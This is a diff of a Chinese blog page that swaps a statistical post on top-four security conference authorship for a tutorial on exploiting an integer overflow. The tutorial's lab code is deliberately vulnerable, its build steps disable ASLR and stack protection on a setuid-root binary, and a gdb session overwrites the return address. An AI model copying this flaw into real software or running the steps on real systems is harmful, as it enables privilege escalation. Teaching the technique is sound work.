-<li>更多的数据：此版收录了17年的文章，较之前一版在总量上增加了40%。</li>
-<li>4种模式的<a href="http://s3.eurecom.fr/~balzarot/notes/top4/affiliations.html" target="_blank" rel="external">作者单位列表</a>：全球版、美国版、欧洲版、其他地区版</li>
-<li>排名前10%作者的所属单位已经精致制图，包含详细信息和历史出版信息热图（参看<a href="http://s3.eurecom.fr/~balzarot/notes/top4/info/97.html" target="_blank" rel="external">这个</a>ETH Zurich的例子）</li>
-<li><a href="http://s3.eurecom.fr/~balzarot/notes/top4/authors.html" target="_blank" rel="external">作者</a>信息页新增活动年份分栏</li>
-<li>包含更多的图表和数据</li>
+<li>0X01 什么是整型上溢出（Integer Overflow）</li>
+<li>0X02 整型下溢出（Integer underflow）</li>
+<li>0X03 利用整型溢出漏洞</li>
 </ul>
 </blockquote>
-<h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p>本数据集包括了自<strong>2000</strong>年以来发表在<strong>ACM CCS</strong>, <strong>Usenix Security</strong>, IEEE Security&amp; Privacy (<strong>Oakland</strong>)和<strong>NDSS</strong>会议上的所有论文。上述四个会议（经常被称作TOP4的会议）每年定期举办并紧密连成周期，也就是当一个会议投稿即将结束时，下一个会议的通知就会发出。（我仍然需要单独发一篇帖子来说明这种方式的弊端）<br>如果你是第一次阅读本文，请注意以下几点：</p>
+<p><u><em>VM Setup: Ubuntu 12.04 (x86)</em></u></p>
+<p><strong>注：本文中overflow指上溢出，underflow指下溢出。默认情况下，溢出指的都是上溢出。</strong></p>
+<h3 id="0X01-什么是整型上溢出"><a href="#0X01-什么是整型上溢出" class="headerlink" title="0X01 什么是整型上溢出"></a>0X01 什么是整型上溢出</h3><p>存储的数值大于支持的最大上限值，即为整型溢出。整型溢出本身不会直接导致任意代码执行，但是它会导致栈溢出或堆溢出，而后两者都会导致任意代码执行。本文我只谈论导致栈溢出的整型溢出，而导致堆溢出的整型溢出我会放在以后的文章中单独讲。</p>
+<p>数据类型大小和范围：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/leve1integer1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/leve1integer1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>当我们要存储的数值大于支持的最大上限值时，数值就会错乱。打个比方，如果我们把2147483648存进有符号整型数据，那么这串数字就会错乱，其值会变为-21471483648。这就叫做整型溢出，并且这种溢出有可能导致任意代码执行。</p>
+<h3 id="0X02-整型下溢出（Integer-underflow）"><a href="#0X02-整型下溢出（Integer-underflow）" class="headerlink" title="0X02 整型下溢出（Integer underflow）"></a>0X02 整型下溢出（Integer underflow）</h3><p>与整型上溢出类似，存储数值小于支持的最小下限值，即为整型下溢出。打个比方，如果我们把-2147483649存进有符号整型数据，那么这串数字就会错乱，其值会变为21471483647。这就叫做整型下溢出。本文中我虽然只讲整型上溢出，但是同样的技术也适用于整型下溢出。</p>
+<p><u><em>漏洞代码：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">store_passwd_indb</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_uname</span><span class="params">(<span class="keyword">char</span>* uname)</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_passwd</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> passwd_buf[<span class="number">11</span>];</div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> passwd_len = <span class="built_in">strlen</span>(passwd); <span class="comment">/* [1] */</span> </div><div class="line"> <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123; <span class="comment">/* [2] */</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Valid Password\n"</span>); <span class="comment">/* [3] */</span> </div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">strcpy</span>(passwd_buf,passwd); <span class="comment">/* [4] */</span></div><div class="line"> &#125; <span class="keyword">else</span> &#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid Password\n"</span>); <span class="comment">/* [5] */</span></div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line"> &#125;</div><div class="line"> store_passwd_indb(passwd_buf); <span class="comment">/* [6] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">if</span>(argc!=<span class="number">3</span>) &#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Usage Error:   \n"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"> &#125;</div><div class="line"> validate_uname(argv[<span class="number">1</span>]);</div><div class="line"> validate_passwd(argv[<span class="number">2</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u><em>编译命令：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p>上述漏洞程序的第[1]行存在整型溢出。strlen()返回的类型是size_t（无符号整型），却被存储在无符号字符串类型中。因此，任意超过无符号字符串数据类型支持的最大上限值的数据都会导致整型溢出。这样一来，当密码长度为261时，261就会被错乱存储在‘passwd_len’变量中，值会变为5。正是由于这种整型溢出漏洞，第[2]行执行的边界检查才能被绕过，从而导致栈缓冲区溢出！而在<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">这一篇</a>文章中我们知道，栈缓冲区溢出会导致任意程序执行。</p>
+<p>为了让大家更好地理解漏洞利用代码，我们在对它做进一步的分析之前，先来反汇编并画出漏洞代码的堆栈布局吧！</p>
+<p><u><em>反汇编：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble validate_passwd </div><div class="line">Dump of assembler code <span class="keyword">for</span> function validate_passwd:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">0</span>&gt;: push %ebp                               <span class="comment">//backup caller's ebp</span></div><div class="line"> <span class="number">0x0804849f</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                           <span class="comment">//set callee's ebp to esp</span></div><div class="line"></div><div class="line"> <span class="number">0x080484a1</span> &lt;+<span class="number">3</span>&gt;: push %edi                               <span class="comment">//backup edi</span></div><div class="line"> <span class="number">0x080484a2</span> &lt;+<span class="number">4</span>&gt;: sub $<span class="number">0x34</span>,%esp                          <span class="comment">//stack space for local variables</span></div><div class="line"> <span class="number">0x080484a5</span> &lt;+<span class="number">7</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax                      <span class="comment">//eax = passwd</span></div><div class="line"> <span class="number">0x080484a8</span> &lt;+<span class="number">10</span>&gt;: movl $<span class="number">0xffffffff</span>,<span class="number">-0x1c</span>(%ebp)           <span class="comment">//String Length Calculation -- Begins here</span></div><div class="line"> <span class="number">0x080484af</span> &lt;+<span class="number">17</span>&gt;: mov %eax,%edx</div><div class="line"> <span class="number">0x080484b1</span> &lt;+<span class="number">19</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x080484b6</span> &lt;+<span class="number">24</span>&gt;: mov <span class="number">-0x1c</span>(%ebp),%ecx</div><div class="line"> <span class="number">0x080484b9</span> &lt;+<span class="number">27</span>&gt;: mov %edx,%edi</div><div class="line"> <span class="number">0x080484bb</span> &lt;+<span class="number">29</span>&gt;: repnz scas %es:(%edi),%al</div><div class="line"> <span class="number">0x080484bd</span> &lt;+<span class="number">31</span>&gt;: mov %ecx,%eax</div><div class="line"> <span class="number">0x080484bf</span> &lt;+<span class="number">33</span>&gt;: not %eax</div><div class="line"> <span class="number">0x080484c1</span> &lt;+<span class="number">35</span>&gt;: sub $<span class="number">0x1</span>,%eax                          <span class="comment">//String Length Calculation -- Ends here</span></div><div class="line"> <span class="number">0x080484c4</span> &lt;+<span class="number">38</span>&gt;: mov %al,<span class="number">-0x9</span>(%ebp)                     <span class="comment">//passwd_len = al</span></div><div class="line"> <span class="number">0x080484c7</span> &lt;+<span class="number">41</span>&gt;: cmpb $<span class="number">0x3</span>,<span class="number">-0x9</span>(%ebp)                   <span class="comment">//if(passwd_len &lt;= 4 )</span></div><div class="line"> <span class="number">0x080484cb</span> &lt;+<span class="number">45</span>&gt;: jbe <span class="number">0x8048500</span> &lt;validate_passwd+<span class="number">98</span>&gt;     <span class="comment">//jmp to 0x8048500</span></div><div class="line"> <span class="number">0x080484cd</span> &lt;+<span class="number">47</span>&gt;: cmpb $<span class="number">0x8</span>,<span class="number">-0x9</span>(%ebp)                   <span class="comment">//if(passwd_len &gt;=8)</span></div><div class="line"> <span class="number">0x080484d1</span> &lt;+<span class="number">51</span>&gt;: ja <span class="number">0x8048500</span> &lt;validate_passwd+<span class="number">98</span>&gt;      <span class="comment">//jmp to 0x8048500</span></div><div class="line"> <span class="number">0x080484d3</span> &lt;+<span class="number">53</span>&gt;: movl $<span class="number">0x8048660</span>,(%esp)                 <span class="comment">//else arg = format string "Valid Password"</span></div><div class="line"> <span class="number">0x080484da</span> &lt;+<span class="number">60</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">puts</span>@plt&gt;              <span class="comment">//call puts</span></div><div class="line"> <span class="number">0x080484df</span> &lt;+<span class="number">65</span>&gt;: mov <span class="number">0x804a020</span>,%eax                     <span class="comment">//eax = stdout </span></div><div class="line"> <span class="number">0x080484e4</span> &lt;+<span class="number">70</span>&gt;: mov %eax,(%esp)                        <span class="comment">//arg = stdout</span></div><div class="line"> <span class="number">0x080484e7</span> &lt;+<span class="number">73</span>&gt;: call <span class="number">0x8048380</span> &lt;fflush@plt&gt;            <span class="comment">//call fflush</span></div><div class="line"> <span class="number">0x080484ec</span> &lt;+<span class="number">78</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax                     <span class="comment">//eax = passwd</span></div><div class="line"> <span class="number">0x080484ef</span> &lt;+<span class="number">81</span>&gt;: mov %eax,<span class="number">0x4</span>(%esp)                     <span class="comment">//arg2 = passwd</span></div><div class="line"> <span class="number">0x080484f3</span> &lt;+<span class="number">85</span>&gt;: lea <span class="number">-0x14</span>(%ebp),%eax                   <span class="comment">//eax = passwd_buf</span></div><div class="line"> <span class="number">0x080484f6</span> &lt;+<span class="number">88</span>&gt;: mov %eax,(%esp)                        <span class="comment">//arg1 = passwd_buf</span></div><div class="line"> <span class="number">0x080484f9</span> &lt;+<span class="number">91</span>&gt;: call <span class="number">0x8048390</span> &lt;<span class="built_in">strcpy</span>@plt&gt;            <span class="comment">//call strcpy</span></div><div class="line"> <span class="number">0x080484fe</span> &lt;+<span class="number">96</span>&gt;: jmp <span class="number">0x8048519</span> &lt;validate_passwd+<span class="number">123</span>&gt;    <span class="comment">//jmp to 0x8048519</span></div><div class="line"> <span class="number">0x08048500</span> &lt;+<span class="number">98</span>&gt;: movl $<span class="number">0x804866f</span>,(%esp)                 <span class="comment">//arg = format string "Invalid Password"</span></div><div class="line"> <span class="number">0x08048507</span> &lt;+<span class="number">105</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">puts</span>@plt&gt;             <span class="comment">//call puts</span></div><div class="line"> <span class="number">0x0804850c</span> &lt;+<span class="number">110</span>&gt;: mov <span class="number">0x804a020</span>,%eax                    <span class="comment">//eax = stdout</span></div><div class="line"> <span class="number">0x08048511</span> &lt;+<span class="number">115</span>&gt;: mov %eax,(%esp)                       <span class="comment">//arg = stdout</span></div><div class="line"> <span class="number">0x08048514</span> &lt;+<span class="number">118</span>&gt;: call <span class="number">0x8048380</span> &lt;fflush@plt&gt;           <span class="comment">//fflush</span></div><div class="line"> <span class="number">0x08048519</span> &lt;+<span class="number">123</span>&gt;: lea <span class="number">-0x14</span>(%ebp),%eax                  <span class="comment">//eax = passwd_buf</span></div><div class="line"> <span class="number">0x0804851c</span> &lt;+<span class="number">126</span>&gt;: mov %eax,(%esp)                       <span class="comment">//arg = passwd_buf</span></div><div class="line"> <span class="number">0x0804851f</span> &lt;+<span class="number">129</span>&gt;: call <span class="number">0x8048494</span>                        <span class="comment">//call store_passwd_indb</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x08048524</span> &lt;+<span class="number">134</span>&gt;: add $<span class="number">0x34</span>,%esp                        <span class="comment">//unwind stack space</span></div><div class="line"> <span class="number">0x08048527</span> &lt;+<span class="number">137</span>&gt;: pop %edi                              <span class="comment">//restore edi</span></div><div class="line"> <span class="number">0x08048528</span> &lt;+<span class="number">138</span>&gt;: pop %ebp                              <span class="comment">//restore ebp</span></div><div class="line"> <span class="number">0x08048529</span> &lt;+<span class="number">139</span>&gt;: ret                                   <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p><u><em>堆栈布局：</em></u></p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/level1integer2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/level1integer2.png" width="450"></a><br>    <figcaption></figcaption><br></figure> 
+
+<p>刚才讲到，一个长度为261的密码会绕过边界检查，并且允许我们覆盖存储于栈内的返回地址。那么好，我们来通过发送一串A的方法进行测试。</p>
+<h3 id="0X03-利用整型溢出漏洞"><a href="#0X03-利用整型溢出漏洞" class="headerlink" title="0X03 利用整型溢出漏洞"></a>0X03 利用整型溢出漏洞</h3><p>测试第一步：这样做是否会覆盖返回地址？</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/iof/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) r sploitfun `python -c 'print "A"*261'`</div><div class="line">Starting program: /home/sploitfun/lsploits/iof/vuln sploitfun `python -c 'print "A"*261'`</div><div class="line">Valid Password</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>测试第二步：来自目标缓冲区的偏移量是什么？</p>
+<p>在这里我们来找找缓冲区‘passed_buf’中返回地址的偏移处于什么位置。之前我们已经反汇编并画出了validate_passwd()的堆栈布局，那么现在就试着找出代码的偏移位置信息吧！由堆栈布局可以看出，返回地址位于缓冲区‘passwd_buf’的偏移(0x18)处。(0x18)计算方式如下：</p>
+<pre><code>0X03 0x18 = 0xb + 0x1 + 0x4 + 0x4 + 0x4
+</code></pre><p>其中：</p>
 <ul>
-<li><p><strong>数据集具有代表性吗？</strong><br>我认为具有代表性。CCS，Oakland，Usenix Security和NDSS是系统安全领域内的四个顶级会议，我想本领域内的每个人都会与我看法一致。但是，这四个会议也不是唯一的标准。也有其他具有较长历史的好会议（例如，ACSAC）；同时，其他领域的顶级会议也会收录系统安全的相关文章。但是，我认为TOP4会议是帮助我们把握系统安全研究、了解领域内研究群体的最好选择。<br>当然，这其中有些会议（主要是CCS和Oakland）是安全领域的主要会议，包括了密码学和应用密码学的文章。这会带来分析结果的偏差，但是我想我们要接受他们的存在，我也不会人为地从数据集中删除非系统类的文章。<br>本数据集包含了这些会议17年来的文章。我有想过将数据集增加，但是并不认为这是一个好主意。NDSS在上世纪90年代是顶级会议吗？</p>
-</li>
-<li><p><strong>数据集完整吗？</strong><br>我认为完整的数据集并不存在。我从这些会议的网站上收集到了所有的信息，其中作者单位不全的，我采用人工的方式下载了对应的PDF文章，补全所有信息。这一过程一定存在粘贴复制的错误（既有我的失误也有会议网站管理员的失误）。此外，我发现有时会议工作人员在制定会议手册时直接采用了投稿的文章标题，而该文章在后期发表中可能更换了标题。<br>许多作者的名字都含有非ASCII字符，因而在不同的文章中拼写不一致。因此，我将所有名字都翻译成近似ASCII字符来显示。但是，ASCII字符表示法也存在一些问题，例如“Xin Cheng Zhang”、“Xin C. Zhang”和“Xin Zhang”（看上去）表示的是同一个人吗？还有一些难以解决的：那些省略中间名或者在不同文章中采用不同名字的人（例如，Srinivas 或 Srini, Chris 或 Christopher, Mike 或Michael, Sal 或 Salvatore, Yoshi 或 Tadayoshi,等）。有些人喜欢随意使用非ASCII字符、缩写、不同的拼写等，导致每篇文章署名都不同。<br>更糟糕的是难以察觉的拼写错误（例如“Herbert”写成“Hebert”）。<br>我写了脚本来应对以上现象，同时也将查出的错误进行了人工修改。但是我找到了所有的错误吗？我想并没有，并且我确定我自己也可能会出错，但是我尽可能的确保正确。<br>最后，作者的单位非常混乱。简单的问题，例如“UC”和“University of California”很容易修复。有时候有些作者添加了实验室或院系的名称，我则需要手动搜索查询，进一步确定是否是同一家机构。最后，公司方面的名称更加复杂。我尽可能将不通过家的分公司加以区分（例如IBM India与T.J. Watson进行区分）。但有些时候这也非常困难，我想我还是在整理中出现了个别错误。</p>
-</li>
+<li>0xb 是 ‘passwd_buf’ 大小</li>
+<li>0x1 是 ‘passwd_len’ 大小</li>
+<li>0x4 是 对齐空间</li>
+<li>0x4 是 EDI</li>
+<li>0x4 是调用者的EBP</li>
 </ul>
-<p>所以</p>
-<pre><code>简言之，数据集中存在不准确的数据和有问题的代码。想想天气预报：人们只能尽可能去准确预测，结果也并非随机，但是却不能确保完美。 
-</code></pre><h3 id="群体大小与投稿数量"><a href="#群体大小与投稿数量" class="headerlink" title="群体大小与投稿数量"></a>群体大小与投稿数量</h3><p>截至目前，本数据集共包括来自<strong>51</strong>个不同国家<strong>699</strong>个单位的<strong>4460</strong>名学者在<strong>68</strong>个会议上发表的<strong>2675</strong>篇文章。首先让我们来看一下投稿的数量。在本学术圈里，人们最常听到的就是TOP4会议的投稿人数逐年增加而发表文章变得越来越难。<br>那么我们首先来看这一言论是否属实：</p>
-<figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/1.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/2.png" width="450"></a><br></figure>
-
-<p>这些图表明确呈现出以下两个特征:一是投稿数量激增，甚至不只是线性变化！然而右图显示文章的接收率并没有下降，这些会议主席们为保障接收率（个人认为在10%-20%）确实做出了不懈努力。<br>然而这样的结果也是有代价的：所有TOP4会议的规模都在扩大而每篇文章的展示时间却在缩短。不幸的是，扩大会议规模只是暂时的解决方案并不能解决核心问题。个人认为，增加一个顶级会议（例如<strong>Euro S&amp;P</strong>正在考虑实施的办法）可能会有效缓解目前的困境。但前提是，这一会议是用来分流而不是引发圈内的新一轮竞争。另一个解决方式是像WWW一样，（利用分会议）实现多轨并行，但是目前来看没有安全领域的会议朝这个方向发展。<br>接下来，让我们看一下都有哪些人在投稿。图表给人的总体感觉是系统安全学术圈在扩张。然而，这可能是系统安全领域出现了更多研究团队，或者主要的研究团队在扩张，进而他们的投稿越来越多。</p>
-<figure class="third"><br>    <a href="http://oij0laovn.bkt.clouddn.com/3.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/3.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/4.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/4.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/5.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/5.png" width="450"></a><br></figure>
-
-<p>左边的图表证实了上述事实。但是，学生毕业后会放弃他们的研究，因此左图显示了来自博士生圈的分析结果。在第二个图中，我侧重绘制了过去两年内<em>积极</em>研究者的人数（也就是在TOP4会议上至少发表过一篇文章的作者）这一结果证实了我们的研究团体在扩大。<br>让我更感到惊讶的是右图的结果。2005年之前，每年新研究机构的数量在减少，这意味着那时，我们的学术圈建设到达了瓶颈，新成员直接加入圈内已有的活跃机构。2005至2010年，新的研究机构缓慢增加。但是2010年以后，新的研究机构迅速增加，因此我们学术圈的扩张得益于每年新的公司和学校的加盟。</p>
-<figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/6.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/6.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/7.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/7.png" width="450"></a><br></figure>
-
-<p>更多的机构组织意味着更多的合作。每篇文章的平均作者数量在增加（见左图蓝线），单一机构撰写文章的数量反而递减（见右图）。具有最多作者文章奖颁发给了<em>Manufacturing Compromise: The Emergence of Exploit-as-a-Service</em>，该文章由来自6个不同机构的18位作者合写（左图中红线表示了每年最多的合作作者数目）。而在另一极端，数据集里包括了<strong>97篇独立作者的文章</strong>（占3.6%）。这一小团体的领军人物是<em>Niels Provos</em>和<em>Peter Gutmann</em>，每人有4篇独立撰写的文章。</p>
-<pre><code>结论？是的，系统安全领域在快速扩张。每年都有新的研究者和研究团体加入这一学术圈。这一变化带来顶级会议的投稿数量逐年增加，目前会议只采用增加接收文章的数量来应对这一变化。但这并非长远之计，让我们拭目以待。
-</code></pre><h3 id="人员地理分布"><a href="#人员地理分布" class="headerlink" title="人员地理分布"></a>人员地理分布</h3><figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/8.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/8.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/9.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/9.png" width="450"></a><br></figure>
-
-<p>这一数据非常有趣。十年前，系统安全领域被美国学者统治，然而，自那之后，来自其他地区的学者（尤其是欧洲学者）在这一领域内的人数不断增加。现阶段本领域内的国际合作非常普遍，合作论文占总论文的20%之多。尽管如此，右边的图表显示，在合作的论文中，美国学者仍然独领风骚。</p>
-<pre><code>美国学者在系统安全领域内虽占主导地位，但是其他国家的学者正缓步追赶。
-更重要并且令人感到欣喜的是，近年来涌现出越来越多的国际合作论文。
-</code></pre><h3 id="会议委员会"><a href="#会议委员会" class="headerlink" title="会议委员会"></a>会议委员会</h3><p>为了有效应对不断增加的投稿，所有会议都选择了组建大型委员会。从2000年开始，NDSS委员会的人数增加了一倍，Oakland增加了两倍，CCS和Usenix的委员会增加了五倍。<br>总体来看，TOP4会议中共有738为委员会成员。其中25%的人从未在同一时间通过这些会议发表过文章。我想这是一个好现象（不同的看法是，更多的人来自企业领域），同时这也不是一个好现象（他们都有评阅论文的能力吗？）。另一方面，排名前200的作者中有13%的人从未担任过任何会议的委员会成员。为什么呢？没有人邀请他们，还是他们并不想做？我们需要进一步验证。</p>
-<figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/10.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/10.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/11.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/11.png" width="450"></a><br></figure>
-
-<p>随着会议委员会人数的增加，正如左图所示，每位评阅者的评审工作量近乎不变。如果平均每篇文章有3个评审人（2个早期拒绝，4人以上应对有争议的论文），那么每位会议委员会成员需要评审21篇文章。这对组委会来说仍然是巨大的（免费）工作量。其中，NDSS近乎每年工作量都在增加，现在已成为圈中工作量最大的会议（而2000年时却是工作量最小的）。<br>右图显示了每个会议组委会历年的变化。曲线起起伏伏，但是重叠人数在20%到50%。我个人认为这是一个很好的平衡，既有新鲜血液的注入，也有老成员的经验。</p>
-<pre><code>现阶段，TOP4会议通过增加委员会人数和接收更多的论文来有效应对不断增加的投稿。但是这种模式能长期可持续发展吗？我们还能做些什么？
-Oakland仍然采用限制同一作者多篇投稿的方式，但是我想采用更多数据来审视这一问题。从2017年开始，他们计划采用VLDB的方式。点此查看更多信息。
-</code></pre><h3 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h3><p>如果想知道本领域最具影响力的作者是谁（请参看此表）。以下是目前最具影响力的前十位作者：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/12.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/12.png" width="450"></a><br></figure>
-
-<p>完整的列表（包含分类栏目）收录了至少发表过两篇文章以上的作者（<a href="http://s3.eurecom.fr/~balzarot/notes/top4/authors.html" target="_blank" rel="external">此处</a>查找）<br>说明：</p>
-<pre><code>active:作者在圈内发表文章的第一年与最后一年
-max: 作者在同一会议中发表的最多论文数
-chairs:该人物担任TOP4会议主席的次数
-slams:同一年里作者在全部TOP4会议上发表文章的总次数
-tpc: 担任会议委员会成员的次数
-venues:作者在全部会议中发表论文的总数
-top4:作者在TOP4会议中发表论文的比例（1到4）
-co-authors:在TOP4会议中发表合作论文的总数
-avg:每篇论文的平均作者人数
-</code></pre><p>仔细查看图表，我们可以获得以下有趣的信息：<br>在单次会议中发表论文次数最多的作者有5篇（但是有14个作者各发表了4篇）。Dawn Song排名第一，同时也是具有最多合作论文的作者（114篇）。Wenke Lee在28个会议委员会中有任职，他同时也是具有最高Slam数额的教授。在前100人中，只有5位女性（我们期待更多）同时来自欧洲的只有13%（我们期待更多）。<br>总体而言，334位作者在TOP4会议中发表了5篇以上论文。相比之下<a href="http://from-a-to-remzi.blogspot.it/2013/05/the-systems-top-50.html" target="_blank" rel="external">The System top 50</a>统计了系统领域内33个会议中53位学者的信息（本文包含了68位）。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/13.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/13.png" width="450"></a><br></figure>
-
-<p>最后的图表显示，在过去的17年里，单一学者在单一会议中发表论文最多的数目在不断增加。对此有多种解释，但是最有可能的就是成功的研究团体拥有的越来越多的成员（拥有15名以上博士生的研究团体并不罕见）。</p>
-<h3 id="所属机构"><a href="#所属机构" class="headerlink" title="所属机构"></a>所属机构</h3><p>现在让我们来看一下排名前十的研究机构：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/14.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/14.png" width="450"></a><br></figure>
-
-<p>(具有分类栏目的完整图表点击<a href="http://s3.eurecom.fr/~balzarot/notes/top4/affiliations.html" target="_blank" rel="external">此处</a>查看)<br>说明：</p>
-<pre><code>coverage: 该机构在会议中发表（至少一篇）论文的比例
-size:拥有在TOP4会议中发表论文的作者数量
-</code></pre><p>值得注意的几点：</p>
